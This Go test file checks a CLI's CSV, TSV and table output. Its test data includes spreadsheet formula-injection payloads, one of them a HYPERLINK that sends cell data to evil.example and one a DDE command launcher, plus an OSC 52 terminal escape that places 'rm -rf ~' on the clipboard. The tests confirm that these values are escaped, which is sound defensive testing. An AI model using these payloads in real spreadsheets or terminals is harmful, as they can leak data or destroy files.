package cmd

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/firmfact/cli/internal/mcp"
)

// A value a spreadsheet would run as a formula is written as text, with a
// single quote in front, in CSV and TSV alike, and so is a column name;
// numbers keep their sign, whether they came as numbers or as text.
func TestDelimitedOutputMarksFormulas(t *testing.T) {
	rows := []map[string]any{
		{"name": `=HYPERLINK("https://evil.example/?"&A2,"Invoice")`, "cost": -12.5, "note": "-1200.50"},
		{"name": "+cmd|' /C calc'!A0", "cost": "+3", "note": "-2+3"},
		{"name": "@SUM(A1:A2)", "cost": "1e5", "note": "\t=1+1"},
		{"name": "\uff1d1+1", "cost": ".5", "note": "- a dash"},
		{"name": "Acme = Bank", "cost": 0.0, "note": "\n=1"},
	}
	cols := []string{"name", "cost", "note", "=col"}
	var out strings.Builder
	if err := writeDelimited(&out, rows, cols, false); err != nil {
		t.Fatal(err)
	}
	records, err := csv.NewReader(strings.NewReader(out.String())).ReadAll()
	if err != nil {
		t.Fatalf("the CSV does not read back: %v", err)
	}
	want := [][]string{
		{"name", "cost", "note", "'=col"},
		{`'=HYPERLINK("https://evil.example/?"&A2,"Invoice")`, "-12.5", "-1200.50", ""},
		{"'+cmd|' /C calc'!A0", "+3", "'-2+3", ""},
		{"'@SUM(A1:A2)", "1e5", "'\t=1+1", ""},
		{"'\uff1d1+1", ".5", "'- a dash", ""},
		{"Acme = Bank", "0", "'\n=1", ""},
	}
	if fmt.Sprint(records) != fmt.Sprint(want) {
		t.Errorf("csv reads back as\n%q\nwant\n%q", records, want)
	}

	out.Reset()
	if err := writeDelimited(&out, rows[:2], cols, true); err != nil {
		t.Fatal(err)
	}
	if want := "name\tcost\tnote\t'=col\n" +
		`'=HYPERLINK("https://evil.example/?"&A2,"Invoice")` + "\t-12.5\t-1200.50\t\n" +
		"'+cmd|' /C calc'!A0\t+3\t'-2+3\t\n"; out.String() != want {
		t.Errorf("tsv:\n%q\nwant:\n%q", out.String(), want)
	}
}

// CSV quotes a value with a comma, a quote or a line break in it, and
// reads back as the values the server sent: not grouped, not rounded. TSV
// has no quoting, so it escapes tabs, line breaks and backslashes instead.
// Terminal controls are escaped in both.
func TestDelimitedOutput(t *testing.T) {
	rows := []map[string]any{
		{"name": "Acme, Inc.", "id": "v1", "cost": 1200.5, "note": `says "hi"`},
		{"name": "Two\nlines", "id": "v2", "cost": "787000.004321", "note": "tab\there, back\\slash"},
		{"name": "Evil" + osc52, "id": "v3", "cost": nil, "note": nil, "tags": []any{"a&b"}},
	}
	cols := []string{"name", "id", "cost", "note", "tags"}

	var out strings.Builder
	if err := writeDelimited(&out, rows, cols, false); err != nil {
		t.Fatal(err)
	}
	assertNoTerminalControls(t, "csv", out.String())
	want := "name,id,cost,note,tags\n" +
		`"Acme, Inc.",v1,1200.5,"says ""hi""",` + "\n" +
		"\"Two\nlines\",v2,787000.004321,\"tab\there, back\\slash\",\n" +
		`Evil\u001b]52;c;cm0gLXJmIH4=\u0007,v3,,,"[""a&b""]"` + "\n"
	if out.String() != want {
		t.Errorf("csv:\n%s\nwant:\n%s", out.String(), want)
	}
	records, err := csv.NewReader(strings.NewReader(out.String())).ReadAll()
	if err != nil {
		t.Fatalf("the CSV does not read back: %v", err)
	}
	if len(records) != 4 || records[1][0] != "Acme, Inc." || records[1][3] != `says "hi"` ||
		records[2][0] != "Two\nlines" || records[2][2] != "787000.004321" || records[2][3] != "tab\there, back\\slash" {
		t.Errorf("records = %q", records)
	}

	out.Reset()
	if err := writeDelimited(&out, rows, cols, true); err != nil {
		t.Fatal(err)
	}
	want = "name\tid\tcost\tnote\ttags\n" +
		"Acme, Inc.\tv1\t1200.5\tsays \"hi\"\t\n" +
		"Two\\nlines\tv2\t787000.004321\ttab\\there, back\\\\slash\t\n" +
		`Evil\\u001b]52;c;cm0gLXJmIH4=\\u0007` + "\tv3\t\t\t[\"a&b\"]\n"
	if out.String() != want {
		t.Errorf("tsv:\n%q\nwant:\n%q", out.String(), want)
	}
	for i, line := range strings.Split(strings.TrimSuffix(out.String(), "\n"), "\n") {
		if n := strings.Count(line, "\t"); n != len(cols)-1 {
			t.Errorf("tsv line %d has %d tabs: %q", i, n, line)
		}
	}
}

// A workspace command prints its rows as CSV or TSV on stdout alone, with
// the notes and the total on stderr; an answer without rows is refused
// rather than printed as something a program reading rows would choke on.
func TestFormatFlag(t *testing.T) {
	isolate(t)
	srv := (&mcpServer{result: vendorsResult}).start(t)
	signedInWithTools(t, srv.URL, listVendors, chatWithWorkspace)

	stdout, stderr, err := run("test", "--host", srv.URL, "vendors", "list", "--format", "csv")
	if err != nil {
		t.Fatalf("--format csv: %v", err)
	}
	if stdout != "name,id,annual_cost\nAcme,v1,1200.5\nGlobex,v2,80\n" {
		t.Errorf("csv = %q", stdout)
	}
	if !strings.Contains(stderr, "Demo workspace: this is sample data.") || !strings.Contains(stderr, "3 total (page 1 of 2; use --page 2 or --all)") {
		t.Errorf("stderr = %q", stderr)
	}
	stdout, _, err = run("test", "--host", srv.URL, "--format", "TSV", "vendors", "list")
	if err != nil || stdout != "name\tid\tannual_cost\nAcme\tv1\t1200.5\nGlobex\tv2\t80\n" {
		t.Errorf("tsv = %q (%v)", stdout, err)
	}

	// --format json is --json.
	asJSON, _, err := run("test", "--host", srv.URL, "--json", "vendors", "list")
	if err != nil {
		t.Fatal(err)
	}
	stdout, _, err = run("test", "--host", srv.URL, "vendors", "list", "--format", "json")
	if err != nil || stdout != asJSON {
		t.Errorf("--format json = %q (%v), want what --json prints: %q", stdout, err, asJSON)
	}
	stdout, _, err = run("test", "--host", srv.URL, "vendors", "list", "--format", "table")
	if err != nil || !strings.HasPrefix(stdout, "NAME") {
		t.Errorf("--format table = %q (%v)", stdout, err)
	}

	chat := (&mcpServer{result: toolResult(t, chatAnswer)}).start(t)
	signedInWithTools(t, chat.URL, chatWithWorkspace)
	stdout, _, err = run("test", "--host", chat.URL, "chat-with-workspace", "--message", "Hi", "--format", "csv")
	if code, _ := Classify(err); code != ExitUsage || stdout != "" {
		t.Errorf("a chat as CSV: exit %d (%v), stdout %q", code, err, stdout)
	}

	for _, args := range [][]string{
		{"--format", "xml", "config", "show"},
		{"--json", "--format", "tsv", "config", "show"},
		{"--format", "csv", "config", "show"},
		{"--host", srv.URL, "vendors", "list", "--all", "--page", "2"},
	} {
		if code, msg := exitStatusOf(t.Context(), "test", args...); code != ExitUsage {
			t.Errorf("%v: exit %d (%s), want %d", args, code, msg, ExitUsage)
		}
	}
	if _, msg := exitStatusOf(t.Context(), "test", "--format", "csv", "config", "show"); msg != "--format csv is for workspace commands and `firmfact call`; use --json here" {
		t.Errorf("csv for config show: %s", msg)
	}
	// A group on its own shows its help, whatever the format.
	if code, msg := exitStatusOf(t.Context(), "test", "--format", "csv", "config"); code != 0 {
		t.Errorf("config --format csv: exit %d (%s)", code, msg)
	}
}

// With one column, a row without a value is still a row: CSV readers skip
// an empty line, so it is written as an empty quoted value. Found by
// FuzzColumnsFor.
func TestOneColumnCSVKeepsEmptyValues(t *testing.T) {
	rows := []map[string]any{{"name": "Acme"}, {"name": ""}, {"name": nil}, {}}
	var out strings.Builder
	if err := writeDelimited(&out, rows, []string{"name"}, false); err != nil {
		t.Fatal(err)
	}
	if want := "name\nAcme\n\"\"\n\"\"\n\"\"\n"; out.String() != want {
		t.Errorf("csv %q, want %q", out.String(), want)
	}
	records, err := csv.NewReader(strings.NewReader(out.String())).ReadAll()
	if err != nil || len(records) != 5 || records[2][0] != "" {
		t.Errorf("records %q (%v)", records, err)
	}
}

// An empty list as CSV is the columns asked for and nothing else; stdout
// holds no sentence for a program to read as a row.
func TestEmptyListAsCSV(t *testing.T) {
	isolate(t)
	srv := (&mcpServer{result: toolResult(t, `[]`, emptyPaging)}).start(t)
	signedInWithTools(t, srv.URL, listVendors)

	stdout, stderr, err := run("test", "--host", srv.URL, "vendors", "list", "--format", "csv")
	if err != nil || stdout != "" || stderr != "No vendors found.\n" {
		t.Errorf("stdout %q, stderr %q (%v)", stdout, stderr, err)
	}
	stdout, _, err = run("test", "--host", srv.URL, "vendors", "list", "--format", "csv", "--columns", "name,cost")
	if err != nil || stdout != "name,cost\n" {
		t.Errorf("stdout %q (%v)", stdout, err)
	}
}

// pagedVendors answers list_vendors with pages of two rows, five rows in
// all, stamped as Demo data with the Demo notice on each page, as the
// server sends them. A page past the last is an error of the test: --all must stop
// at total_pages.
func pagedVendors(t *testing.T) func(toolCall) string {
	return func(call toolCall) string {
		page, given := call.Arguments["page"].(float64)
		if !given {
			page = 1 // the server's default
		}
		var rows []any
		for i := int(page-1) * 2; i < min(int(page)*2, 5); i++ {
			rows = append(rows, map[string]any{"name": fmt.Sprintf("Vendor %d", i+1), "id": fmt.Sprintf("v%d", i+1), "cost": float64(i+1) * 1000})
		}
		if page < 1 || page > 3 {
			t.Errorf("asked for page %v of 3", call.Arguments["page"])
			rows = []any{}
		}
		return toolResult(t, "Demo workspace: this is sample data.",
			mustJSON(t, map[string]any{"workspace_data_source": "demo_sample_data", "data": rows}),
			mustJSON(t, map[string]any{"meta": map[string]any{"total_count": 5, "page": page, "per_page": 2, "total_pages": 3}}))
	}
}

// --all fetches page after page at the largest limit the tool takes, until
// total_pages, and prints them as one list: a table, CSV, or with --json
// one row per line. A note the server repeats on each page shows once.
func TestAllFetchesEveryPage(t *testing.T) {
	isolate(t)
	// call fetches the list for the tools the cache lacks; list_contracts
	// comes without its arguments.
	f := &mcpServer{respond: pagedVendors(t), tools: []mcp.Tool{listVendors, chatWithWorkspace, {Name: "list_contracts", Annotations: readsOnly}}}
	srv := f.start(t)
	signedInWithTools(t, srv.URL, listVendors)

	stdout, stderr, err := run("test", "--host", srv.URL, "vendors", "list", "--all", "--format", "csv")
	if err != nil {
		t.Fatalf("--all: %v", err)
	}
	calls := f.calls()
	if len(calls) != 3 {
		t.Fatalf("calls = %+v, want pages 1 to 3", calls)
	}
	for i, call := range calls {
		if call.Arguments["page"] != float64(i+1) || call.Arguments["limit"] != float64(200) {
			t.Errorf("call %d arguments = %v, want page %d with limit 200", i, call.Arguments, i+1)
		}
	}
	want := "name,id,cost\nVendor 1,v1,1000\nVendor 2,v2,2000\nVendor 3,v3,3000\nVendor 4,v4,4000\nVendor 5,v5,5000\n"
	if stdout != want {
		t.Errorf("csv = %q, want %q", stdout, want)
	}
	if stderr != "Demo workspace: this is sample data.\n5 total\n" {
		t.Errorf("stderr = %q", stderr)
	}

	stdout, _, err = run("test", "--host", srv.URL, "vendors", "list", "--all")
	if err != nil {
		t.Fatal(err)
	}
	if lines := strings.Split(strings.TrimSpace(stdout), "\n"); len(lines) != 6 || !strings.HasPrefix(lines[5], "Vendor 5") {
		t.Errorf("table = %q", stdout)
	}

	stdout, stderr, err = run("test", "--host", srv.URL, "--json", "vendors", "list", "--all", "--limit", "2")
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSuffix(stdout, "\n"), "\n")
	if len(lines) != 5 {
		t.Fatalf("NDJSON = %q, want a line per row", stdout)
	}
	for i, line := range lines {
		var row map[string]any
		if err := json.Unmarshal([]byte(line), &row); err != nil || row["id"] != fmt.Sprintf("v%d", i+1) {
			t.Errorf("line %d = %q (%v)", i, line, err)
		}
	}
	if calls := f.calls(); calls[len(calls)-1].Arguments["limit"] != float64(2) {
		t.Errorf("--limit given with --all: %v", calls[len(calls)-1].Arguments)
	}
	if stderr != "Demo workspace: this is sample data.\n" {
		t.Errorf("stderr = %q", stderr)
	}

	// call pages too, and says how under its paging hint.
	stdout, _, err = run("test", "--host", srv.URL, "call", "list_vendors", "--all", "--format", "tsv")
	if err != nil || strings.Count(stdout, "\n") != 6 {
		t.Errorf("call --all = %q (%v)", stdout, err)
	}
	_, stderr, err = run("test", "--host", srv.URL, "call", "list_vendors")
	if err != nil || !strings.Contains(stderr, "5 total (page 1 of 3; use --arg page=2 or --all)") {
		t.Errorf("call hint: stderr = %q (%v)", stderr, err)
	}
	for _, args := range [][]string{
		{"call", "list_vendors", "--all", "--arg", "page=2"},
		{"call", "chat_with_workspace", "--all"},
		{"call", "list_contracts", "--all"},
	} {
		if code, msg := exitStatusOf(t.Context(), "test", append([]string{"--host", srv.URL}, args...)...); code != ExitUsage {
			t.Errorf("%v: exit %d (%s), want %d", args, code, msg, ExitUsage)
		}
	}
}

// A server that sends the same page whatever page is asked for would keep
// --all going for ever; it stops at the first page that is not the one
// asked for.
func TestAllStopsWhenThePageIsIgnored(t *testing.T) {
	isolate(t)
	f := &mcpServer{respond: func(toolCall) string {
		return toolResult(t, vendorRows, `{"meta":{"total_count":6,"page":1,"per_page":2,"total_pages":3}}`)
	}}
	srv := f.start(t)
	signedInWithTools(t, srv.URL, listVendors)
	_, _, err := run("test", "--host", srv.URL, "vendors", "list", "--all")
	if err == nil || err.Error() != "asked for page 2, the server sent page 1" {
		t.Errorf("err = %v", err)
	}
	if n := len(f.calls()); n != 2 {
		t.Errorf("calls = %d, want 2", n)
	}
}

// --columns picks the columns and their order, and is sent as the fields
// argument where the tool takes one, from a generated command and from
// call; --fields given as well wins for what is sent, one field per use.
func TestColumnsReachFields(t *testing.T) {
	isolate(t)
	f := &mcpServer{result: vendorsResult}
	srv := f.start(t)
	signedInWithTools(t, srv.URL, listVendors, chatWithWorkspace)

	stdout, stderr, err := run("test", "--host", srv.URL, "vendors", "list", "--columns", "annual_cost, name,nope")
	if err != nil {
		t.Fatal(err)
	}
	if got := mustJSON(t, f.calls()[0].Arguments["fields"]); got != `["annual_cost","name","nope"]` {
		t.Errorf("fields = %s", got)
	}
	if stdout != "ANNUAL_COST  NAME    NOPE\n   1,200.50  Acme\n      80.00  Globex\n" {
		t.Errorf("table = %q", stdout)
	}
	if !strings.Contains(stderr, "note: no row has the column nope.\n") {
		t.Errorf("stderr = %q", stderr)
	}

	if _, _, err := run("test", "--host", srv.URL, "call", "list_vendors", "--columns", "name"); err != nil {
		t.Fatal(err)
	}
	if got := mustJSON(t, f.calls()[1].Arguments["fields"]); got != `["name"]` {
		t.Errorf("call: fields = %s", got)
	}
	if _, _, err := run("test", "--host", srv.URL, "vendors", "list", "--columns", "name", "--fields", "name", "--fields", "id"); err != nil {
		t.Fatal(err)
	}
	if got := mustJSON(t, f.calls()[2].Arguments["fields"]); got != `["name","id"]` {
		t.Errorf("with --fields: fields = %s", got)
	}

	// A tool without fields is sent none.
	chat := &mcpServer{result: toolResult(t, `[{"name":"A","id":"1"}]`)}
	chatSrv := chat.start(t)
	signedInWithTools(t, chatSrv.URL, chatWithWorkspace)
	stdout, _, err = run("test", "--host", chatSrv.URL, "chat-with-workspace", "--message", "Hi", "--columns", "id")
	if err != nil || stdout != "ID\n 1\n" {
		t.Errorf("stdout = %q (%v)", stdout, err)
	}
	if _, sent := chat.calls()[0].Arguments["fields"]; sent {
		t.Errorf("arguments = %v", chat.calls()[0].Arguments)
	}
	if code, _ := exitStatusOf(t.Context(), "test", "--host", srv.URL, "vendors", "list", "--columns", " , "); code != ExitUsage {
		t.Errorf("--columns with no names: exit %d", code)
	}
}

// Numbers align on their last digit, amounts of money are grouped to the
// cent, and the columns a reader looks for come first.
func TestTableAlignsNumbers(t *testing.T) {
	rows := []map[string]any{
		{"website": "acme.example", "qty": "13.0", "monthly_cost": 1200.5, "name": "A", "status": "active", "code": "1e5", "temporal_id": "t1"},
		{"website": "globex.example", "qty": "2", "monthly_cost": "80", "name": "Bb", "status": "ended", "code": "0x10", "temporal_id": "t2"},
	}
	var out, notes strings.Builder
	if err := printTable(&out, &notes, rows, tableStyle{}); err != nil {
		t.Fatal(err)
	}
	want := "" +
		"NAME  STATUS  MONTHLY_COST  CODE   QTY  TEMPORAL_ID  WEBSITE\n" +
		"A     active      1,200.50  1e5   13.0  t1           acme.example\n" +
		"Bb    ended          80.00  0x10     2  t2           globex.example\n"
	if out.String() != want {
		t.Errorf("got:\n%s\nwant:\n%s", out.String(), want)
	}
}

// On an 80-column terminal the table fits: long text is cut with an
// ellipsis, the widest first, numbers are never cut, and columns that
// still do not fit are left out from the right, with a note on stderr.
func TestTableFitsTheWidth(t *testing.T) {
	long := strings.Repeat("Morningstar PitchBook Enterprise ", 3)
	rows := []map[string]any{
		{"name": long, "id": "118b1b32-b400-4491-ac53-d847ba35a1b9", "cost": 1234567.891, "userdef_id": "V-1"},
		{"name": "Eurex", "id": "bcce6995-21ff-45d8-a966-210edaf38612", "cost": 95.62, "userdef_id": "V-2"},
	}
	var out, notes strings.Builder
	if err := printTable(&out, &notes, rows, tableStyle{width: 80}); err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSuffix(out.String(), "\n"), "\n")
	if len(lines) != 3 {
		t.Fatalf("table = %q", out.String())
	}
	widest := 0
	for _, line := range lines {
		widest = max(widest, utf8.RuneCountInString(line))
	}
	if widest != 80 {
		t.Errorf("widest line is %d columns, want the table to fill 80:\n%s", widest, out.String())
	}
	if !strings.HasPrefix(lines[1], "Morningstar PitchBook") || !strings.Contains(lines[1], "…") || !strings.Contains(lines[1], "1,234,567.89") ||
		!strings.Contains(lines[1], "V-1") || !strings.HasPrefix(lines[2], "Eurex ") {
		t.Errorf("table:\n%s", out.String())
	}
	if notes.Len() != 0 {
		t.Errorf("notes = %q", notes.String())
	}

	// --wide: the width is not the table's concern.
	out.Reset()
	if err := printTable(&out, &notes, rows, tableStyle{}); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out.String(), "…") || !strings.Contains(out.String(), long) {
		t.Errorf("unfitted table:\n%s", out.String())
	}

	// Twenty columns cannot fit in 80 however they are cut.
	wide := map[string]any{"name": "Acme"}
	for i := range 20 {
		wide[fmt.Sprintf("field_%02d", i)] = strings.Repeat("x", 12)
	}
	out.Reset()
	if err := printTable(&out, &notes, []map[string]any{wide}, tableStyle{width: 80}); err != nil {
		t.Fatal(err)
	}
	for _, line := range strings.Split(strings.TrimSuffix(out.String(), "\n"), "\n") {
		if n := utf8.RuneCountInString(line); n > 80 {
			t.Errorf("line of %d columns: %q", n, line)
		}
	}
	if !strings.HasPrefix(out.String(), "NAME  FIELD_00") || !strings.HasPrefix(notes.String(), "note: 13 columns left out to fit the terminal (field_07, field_08,") ||
		!strings.HasSuffix(notes.String(), "field_19); --wide shows every column, --columns picks them.\n") {
		t.Errorf("table:\n%s\nnotes: %q", out.String(), notes.String())
	}
}

func TestCutCell(t *testing.T) {
	cases := []struct {
		s     string
		width int
		want  string
	}{
		{"Acme", 8, "Acme"},
		{"Bloomberg Finance", 10, "Bloomberg…"},
		{"S&P Global Inc.", 5, "S&P…"}, // no space before the ellipsis
		{"Zürich Börse", 7, "Zürich…"},
		{"x", 1, "x"},
		{"xy", 1, "…"},
	}
	for _, c := range cases {
		if got := cutCell(c.s, c.width); got != c.want {
			t.Errorf("cutCell(%q, %d) = %q, want %q", c.s, c.width, got, c.want)
		}
	}
}

// One column wider than the terminal is cut to it; it is not left out.
func TestTableOfOneWideColumn(t *testing.T) {
	var out, notes strings.Builder
	rows := []map[string]any{{"note": strings.Repeat("word ", 30)}}
	if err := printTable(&out, &notes, rows, tableStyle{width: 40}); err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSuffix(out.String(), "\n"), "\n")
	if len(lines) != 2 || lines[0] != "NOTE" || utf8.RuneCountInString(lines[1]) != 40 || !strings.HasSuffix(lines[1], "…") || notes.Len() != 0 {
		t.Errorf("table = %q, notes = %q", out.String(), notes.String())
	}

	// Narrower than any column may be cut to, the first column still
	// shows, and the rest are left out.
	out.Reset()
	rows[0]["size"] = 12.5
	if err := printTable(&out, &notes, rows, tableStyle{width: 5}); err != nil {
		t.Fatal(err)
	}
	if out.String() != "NOTE\nword…\n" || notes.String() != "note: 1 column left out to fit the terminal (size); --wide shows every column, --columns picks them.\n" {
		t.Errorf("table = %q, notes = %q", out.String(), notes.String())
	}
}

// --all asks for as many rows as the tool allows, which may be fewer than
// the server's usual most.
func TestPageSizeFollowsTheSchema(t *testing.T) {
	limited := listVendors
	limited.InputSchema = map[string]any{"properties": map[string]any{"limit": map[string]any{"type": "integer", "maximum": float64(50)}}}
	for _, c := range []struct {
		tool mcp.Tool
		want int
	}{{listVendors, 200}, {limited, 50}, {chatWithWorkspace, 200}} {
		if got := pageSize(c.tool); got != c.want {
			t.Errorf("pageSize(%s) = %d, want %d", c.tool.Name, got, c.want)
		}
	}
}
